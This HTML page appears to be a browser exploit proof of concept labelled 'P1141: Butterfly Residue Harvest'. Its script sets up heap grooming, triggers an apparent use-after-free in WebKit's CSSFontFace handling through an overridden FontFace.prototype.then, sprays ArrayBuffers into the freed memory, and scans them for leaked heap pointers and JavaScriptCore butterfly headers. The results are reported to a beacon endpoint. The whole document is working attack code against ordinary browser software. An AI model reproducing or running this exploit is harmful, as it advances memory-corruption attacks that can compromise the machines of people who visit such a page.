<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1141</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
</head><body><div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}

log('phase','=== P1141: BUTTERFLY RESIDUE HARVEST ===');
log('info','Pre-free 192-byte array butterflies, spray over them via UAF');
log('info','Butterfly of 23 indexed elements: 8 (header) + 23*8 = 192 bytes');
B('P1141-START','t='+Date.now());

// ===== Step 1: Create arrays with 23 object elements (192-byte butterflies) =====
var NBUTT=300;
var butterflies=[];
var elemObjs=[];

log('info','Creating '+NBUTT+' arrays of 23 objects each...');
for(var i=0;i<NBUTT;i++){
  var arr=new Array(23);
  for(var j=0;j<23;j++){
    var obj={idx:i*23+j, v:Math.random()};
    arr[j]=obj;
    if(i<3) elemObjs.push(obj); // keep some alive for reference
  }
  butterflies.push(arr);
}

// Also try different element counts to hit different size classes
// 11 elements: 8 + 88 = 96 bytes
// 15 elements: 8 + 120 = 128 bytes
// 19 elements: 8 + 152 = 160 bytes
var extra_arrs=[];
for(var i=0;i<100;i++){
  var a11=new Array(11);
  var a15=new Array(15);
  var a19=new Array(19);
  for(var j=0;j<19;j++){
    var o={z:i*19+j};
    if(j<11)a11[j]=o;
    if(j<15)a15[j]=o;
    a19[j]=o;
  }
  extra_arrs.push(a11,a15,a19);
}

log('ok','Created '+NBUTT+' butterflies + '+extra_arrs.length+' extra');

// ===== Step 2: Free butterflies =====
log('info','Nulling arrays to free butterflies...');
for(var i=0;i<butterflies.length;i++) butterflies[i]=null;
butterflies=null;
for(var i=0;i<extra_arrs.length;i++) extra_arrs[i]=null;
extra_arrs=null;

// ===== Step 3: Force GC =====
log('info','Forcing GC pressure...');
for(var gc=0;gc<15;gc++){
  var trash=[];
  for(var i=0;i<8000;i++) trash.push(new ArrayBuffer(64));
  trash=null;
}

// ===== Step 4: Now trigger CSSFontFace UAF + spray =====
log('info','Triggering UAF + spray...');
var r=Date.now()%100000;
var uafHit=false;
var spray192=[];
var spray96=[];
var spray128=[];
var spray160=[];

var st=document.createElement('style');
st.textContent="@font-face{font-family:b"+r+";src:local(Arial);unicode-range:U+0042}";
document.head.appendChild(st);
var ff=new FontFace('c'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(ff);void ff.loaded;

Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(uafHit)return undefined;uafHit=true;
  if(st.parentNode)st.remove();
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;

  // Heavy spray at 192 bytes (butterfly size) + extra sizes
  for(var k=0;k<250;k++) spray192.push(new ArrayBuffer(192));
  for(var k=0;k<80;k++) spray96.push(new ArrayBuffer(96));
  for(var k=0;k<80;k++) spray128.push(new ArrayBuffer(128));
  for(var k=0;k<80;k++) spray160.push(new ArrayBuffer(160));

  try{document.fonts.check('1em b'+r);}catch(e){}
  return undefined;
},set:function(){}});

document.fonts.load('1em c'+r+', b'+r,'AB').then(function(){},function(){});

setTimeout(function(){
  delete FontFace.prototype.then;

  // ===== Step 5: Scan ALL buffers for non-zero data =====
  var allSizes=[
    {name:'192',bufs:spray192},
    {name:'96',bufs:spray96},
    {name:'128',bufs:spray128},
    {name:'160',bufs:spray160}
  ];

  var totalNZ=0;
  var cffHit=false;
  var butterflyHits=[];
  var ptrHits=[];

  for(var si=0;si<allSizes.length;si++){
    var sz=allSizes[si];
    var nzCount=0;

    for(var k=0;k<sz.bufs.length;k++){
      var v=new BigUint64Array(sz.bufs[k]);
      var hasNZ=false;
      for(var q=0;q<v.length;q++){if(v[q]!==0n){hasNZ=true;break;}}
      if(!hasNZ)continue;
      nzCount++;

      // Full dump
      var dump=[];
      var classified=[];
      for(var q=0;q<v.length;q++){
        var val=v[q];
        dump.push(hex64(val));
        if(val===0n)continue;

        var hi=Number(val>>32n);
        var lo=Number(val&0xFFFFFFFFn);
        var tag;

        if(val===1n) tag='RC';
        else if(hi>=0xFFFF) tag='INT'; // JSValue integer
        else if(hi>=0xFFFE) tag='DBL'; // JSValue double (NaN-boxed)
        else if(hi>=0x10&&hi<=0xFF) tag='HP'; // heap pointer
        else if(hi===0&&lo>=0x100000) tag='PTR?'; // possible low pointer
        else if(hi>=1&&hi<=0xF) tag='GC?'; // possible GC heap pointer
        else if(hi===0&&lo<0x100) tag='SM'; // small value
        else tag='?(0x'+hi.toString(16)+')';

        classified.push('q'+q+'='+hex64(val)+'['+tag+']');

        // Track interesting values
        if(tag==='GC?'||tag==='PTR?'||(tag.charAt(0)==='?'&&hi>0)){
          ptrHits.push({sz:sz.name,k:k,q:q,val:hex64(val),tag:tag,hi:'0x'+hi.toString(16)});
        }
      }

      // CSSFontFace identification
      if(sz.name==='192'&&v[0]===1n&&v[11]!==0n&&v[13]!==0n){
        var h11=Number(v[11]>>32n);
        if(h11>=0x10&&h11<=0xFF){
          cffHit=true;
          B('P1141-CFF','k='+k+'|q11='+hex64(v[11])+'|q13='+hex64(v[13]));
          log('ok','CSSFontFace: q11='+hex64(v[11]));
          continue; // Don't count as butterfly
        }
      }

      // Butterfly identification: first qword is IndexingHeader
      // IndexingHeader = {publicLength:u32, vectorLength:u32}
      // For 23 elements: should be {23, 23} = 0x0000001700000017
      if(v[0]!==1n&&v[0]!==0n){ // Not CSSFontFace (rc=1) and not empty
        var pubLen=Number(v[0]&0xFFFFFFFFn);
        var vecLen=Number(v[0]>>32n);
        if(pubLen>0&&pubLen<=30&&vecLen>0&&vecLen<=30){
          butterflyHits.push({sz:sz.name,k:k,pubLen:pubLen,vecLen:vecLen,
            sample:classified.slice(0,8).join(',')});
          log('win','BUTTERFLY? sz='+sz.name+' k='+k+' pubLen='+pubLen+' vecLen='+vecLen);
          log('ptr','  '+classified.slice(0,8).join(' '));
        }
      }

      // Report non-zero buffers
      if(nzCount<=5){
        B('P1141-NZ-'+sz.name+'-'+k,classified.join('|'));
      }
    }

    if(nzCount>0){
      totalNZ+=nzCount;
      B('P1141-SZ-'+sz.name,'nz='+nzCount+'/'+sz.bufs.length);
      log('info','sz='+sz.name+': '+nzCount+'/'+sz.bufs.length+' non-zero');
    }
  }

  // Report findings
  B('P1141-PTRS','count='+ptrHits.length);
  for(var i=0;i<Math.min(ptrHits.length,10);i++){
    B('P1141-PTR-'+i,JSON.stringify(ptrHits[i]));
    log('ptr','PTR: sz='+ptrHits[i].sz+' q'+ptrHits[i].q+'='+ptrHits[i].val+' ['+ptrHits[i].tag+']');
  }

  B('P1141-BUTT','count='+butterflyHits.length);
  for(var i=0;i<Math.min(butterflyHits.length,5);i++){
    B('P1141-BUTT-'+i,JSON.stringify(butterflyHits[i]));
  }

  B('P1141-DONE','total_nz='+totalNZ+'|cff='+cffHit+'|butt='+butterflyHits.length+'|ptrs='+ptrHits.length);
  log('phase','=== DONE: '+totalNZ+' non-zero, '+butterflyHits.length+' butterflies, '+ptrHits.length+' ptrs ===');
},15);
</script></body></html>
